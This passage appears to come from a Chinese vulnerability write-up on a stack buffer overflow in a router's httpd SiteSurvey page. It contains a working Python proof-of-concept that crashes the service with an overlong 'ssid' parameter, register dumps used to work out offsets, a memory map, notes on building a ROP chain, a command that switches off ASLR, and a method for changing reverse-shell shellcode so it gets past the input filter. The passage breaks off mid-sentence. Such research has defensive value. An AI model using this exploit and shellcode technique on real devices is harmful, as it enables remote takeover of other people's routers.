          }
          else {
            piStack3020 = (int *)0x0;
          }
        }
        __s_00 = (char *)httpGetEnv(param_1,"rate");
        if (__s_00 != (char *)0x0) {
          iStack3016 = atoi(__s_00);
        }
        httpPrintf(param_1,
                   "\n",__s,uVar12);
        httpPrintf(param_1,"",__s,uVar12);
        uVar9 = 0;
        HttpWebV4Head(param_1,0,0,uVar12);
        __s_00 = "/userRpm/WzdWlanSiteSurveyRpm_AP.htm";
      }
## 漏洞验证
写了一个 脚本来验证一下：
    import requests
    import socket
    import socks
    import urllib
    SOCKS5_PROXY_HOST = '127.0.0.1' # socks 代 理 IP地 址 是 用 ssh -D进 行 端 口 转 发 ， 需 要 设 置
        代 理
    SOCKS5_PROXY_PORT = 9999 # socks 代 理 本 地 端 口
    default_socket = socket.socket
    socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
    socket.socket = socks.socksocket
    session = requests.Session()
    session.verify = False
    def exp(path,cookie):
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Cookie":"Authorization=Basic{cookie}".format(cookie=str(cookie))}
        payload="/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
            params = {
            "mode":"1000",
                    "curRegion":"1000",
                    "chanWidth":"100",
                    "channel":"1000",
                    "ssid":urllib.request.unquote(payload)
            }
        url="http://ip:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm".for    mat(path=str(path))
        resp = session.get(url,params=params,headers=headers,timeout=10)
            print (resp.text)
    exp("TFDTDFTCUJPCWNEB","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
使用 wireshark 抓包，查看发送的数据包：
  * 注意这里的 ssid 里的内容需要加上 unquote 函数对 %0A 先进行解码，因为 python requests 发送数据包时会默认对参数值进行编码。
结果会发现远程路由器服务崩溃，gdbserver 抛出了 SIGSEGV 的栈溢出信号。
## 漏洞利用
### 使用 mipsrop 插件查找 ROP
崩溃之后，查看上下文环境，查看 pc，sp 寄存器的值确定偏移：
    $t6 : 0x61636661 ("afca"?)   (a*218+t6)
    $t7 : 0x0
    $s0 : 0x61616261 ("abaa"?)，实际上是大端，应该是aaba（a*2+s0）
    $s1 : 0x61616361 ("acaa"?) (a*6+s1)
    $s2 : 0x61616461 ("adaa"?)
    $s3 : 0x5
    $s4 : 0x0
    $s5 : 0x7
    $s6 : 0x0
    $s7 : 0x0064d6bc → 0x0064e7f4 → 0x000a0003
    $t8 : 0x2
    $t9 : 0x77faf980 → 0x3c1c0002
    $k0 : 0x0
    $k1 : 0x0
    $s8 : 0x7d7fedf8 → "abwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaac[...]"
    $pc : 0x61616561 ("aeaa"?)
    $sp : 0x7d7fed50 → "aafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa[...]"
    $hi : 0x36c67
    $lo : 0x6338ceeb
    $fir : 0x739300
    $ra : 0x61616561 ("aeaa"?)
    $gp : 0x00594d80 → 0x00000000
计算得出偏移：
    sp的偏移为 "/%0A"*0x55+ "a"*2+"aaaa"*4
    payload="/%0A"*0x55+'a'*2
    payload+=s0
    payload+=s1
    payload+=s2
    payload+=pc,ra
    gef➤ vmmap
    [ Legend: Code | Heap | Stack ]
    Start End Offset Perm Path
    0x00400000 0x00561000 0x00000000 r-x /usr/bin/httpd
    0x00571000 0x00590000 0x00161000 rw- /usr/bin/httpd
    0x00590000 0x0066e000 0x00000000 rwx [heap]
    0x77e05000 0x77e46000 0x00000000 rw-    0x77e46000 0x77ea3000 0x00000000 r-x /lib/libuClibc-0.9.30.so
    0x77ea3000 0x77eb2000 0x00000000 ---    0x77eb2000 0x77eb3000 0x0005c000 r-- /lib/libuClibc-0.9.30.so
    0x77eb3000 0x77eb4000 0x0005d000 rw- /lib/libuClibc-0.9.30.so
    0x77eb4000 0x77eb9000 0x00000000 rw-    0x77eb9000 0x77ee3000 0x00000000 r-x /lib/libgcc_s.so.1
    0x77ee3000 0x77ef3000 0x00000000 ---    0x77ef3000 0x77ef4000 0x0002a000 rw- /lib/libgcc_s.so.1
    0x77ef4000 0x77ef6000 0x00000000 r-x /lib/libwpa_ctrl.so
    0x77ef6000 0x77f05000 0x00000000 ---    0x77f05000 0x77f06000 0x00001000 rw- /lib/libwpa_ctrl.so
    0x77f06000 0x77f07000 0x00000000 r-x /lib/libutil.so.0
    0x77f07000 0x77f16000 0x00000000 ---    0x77f16000 0x77f17000 0x00000000 rw- /lib/libutil.so.0
    0x77f17000 0x77f18000 0x00000000 r-x /lib/libmsglog.so
    0x77f18000 0x77f27000 0x00000000 ---    0x77f27000 0x77f28000 0x00000000 rw- /lib/libmsglog.so
    0x77f28000 0x77f29000 0x00000000 r-x /lib/librt.so.0
    0x77f29000 0x77f38000 0x00000000 ---    0x77f38000 0x77f39000 0x00000000 rw- /lib/librt.so.0
    0x77f39000 0x77f96000 0x00000000 r-x /lib/libc.so.0
    0x77f96000 0x77fa5000 0x00000000 ---    0x77fa5000 0x77fa6000 0x0005c000 r-- /lib/libc.so.0
    0x77fa6000 0x77fa7000 0x0005d000 rw- /lib/libc.so.0
    0x77fa7000 0x77fac000 0x00000000 rw-    0x77fac000 0x77fb9000 0x00000000 r-x /lib/libpthread.so.0
    0x77fb9000 0x77fc8000 0x00000000 ---    0x77fc8000 0x77fc9000 0x0000c000 r-- /lib/libpthread.so.0
    0x77fc9000 0x77fce000 0x0000d000 rw- /lib/libpthread.so.0
    0x77fce000 0x77fd0000 0x00000000 rw-    0x77fd0000 0x77fd1000 0x00000000 r-x /hook_mips
    0x77fd1000 0x77fe0000 0x00000000 ---    0x77fe0000 0x77fe1000 0x00000000 r-- /hook_mips
    0x77fe1000 0x77fe2000 0x00001000 rw- /hook_mips
    0x77fe2000 0x77fe7000 0x00000000 r-x /lib/ld-uClibc.so.0
    0x77ff1000 0x77ff5000 0x00000000 rw- /SYSV0000002f (deleted)
    0x77ff5000 0x77ff6000 0x00000000 rw-    0x77ff6000 0x77ff7000 0x00004000 r-- /lib/ld-uClibc.so.0
    0x77ff7000 0x77ff8000 0x00005000 rw- /lib/ld-uClibc.so.0
    0x7d7fd000 0x7d800000 0x00000000 rwx
    0x7d9fd000 0x7da00000 0x00000000 rwx
    0x7dbfd000 0x7dc00000 0x00000000 rwx
    0x7ddfd000 0x7de00000 0x00000000 rwx
    0x7dffd000 0x7e000000 0x00000000 rwx
    0x7e1fd000 0x7e200000 0x00000000 rwx
    0x7e3fd000 0x7e400000 0x00000000 rwx
    0x7e5fd000 0x7e600000 0x00000000 rwx
    0x7e7fd000 0x7e800000 0x00000000 rwx
    0x7e9fd000 0x7ea00000 0x00000000 rwx
    0x7ebfd000 0x7ec00000 0x00000000 rwx
    0x7edfd000 0x7ee00000 0x00000000 rwx
    0x7effd000 0x7f000000 0x00000000 rwx
    0x7f1fd000 0x7f200000 0x00000000 rwx
    0x7f3fd000 0x7f400000 0x00000000 rwx
    0x7f5fd000 0x7f600000 0x00000000 rwx
    0x7f7fd000 0x7f800000 0x00000000 rwx
    0x7ffd6000 0x7fff7000 0x00000000 rwx [stack]
    0x7fff7000 0x7fff8000 0x00000000 r-x [vdso]
在 gdb 调试器中找到libc的基地址，这里主要使用libc.so库来查找rop。
  * 关于 ROP 链的构造参考H4lo之前在安全客上发表过的这篇文章：
总结起来就是一张图：
注意点：
  1. 因为cache机制，写进缓冲区的数据会先放到不会立刻存放到栈上，一般解决方案就是如上图调用一个sleep函数。
  2. branch delay slot机制使得汇编程序并非一条直线运行下去.
下面汇编语句中的li $a0, 3实际上也会执行
    LOAD:0000E204                 move    $t9, $s1
    LOAD:0000E208                 jalr    $t9 ; sysconf
    LOAD:0000E20C                 li      $a0, 3
模拟器内核可能开启了ALSR，方便演示先关闭保护机制：
    sudo sh -c "echo '0' > /proc/sys/kernel/randomize_va_space"
### shellcode 查找/构造
贴出两个查找shellcode网站
直接使用现成的反弹 shell 的 shellcode 发现行不通，原因是程序中对数据有过滤，需要对shellcode修改。
  * 对 shellcode 的修改方法主要有两种：
1、同指令替换。  
2、进行简单编码。
这里采用指令替换的方法，针对于 lui 指令的字节码为 0x3c（/）的情况下，使用一些无关指令，如填充ori t3,t3,0xff3c指令时，3c
会被编码成 5c3c，那么这时候3c就逃逸到下一个内存空间中，这个 3c 就可以继续使用了（针对于开头为 3c 的汇编指令）。
过程总结如下：
    1. 选择一个无用的寄存器 t3，填充 ori $t3, $t3, 0xff3c。对应的汇编字节码为 "\x35\x6b\xff\x3c"
    2. 结尾的 \x3c (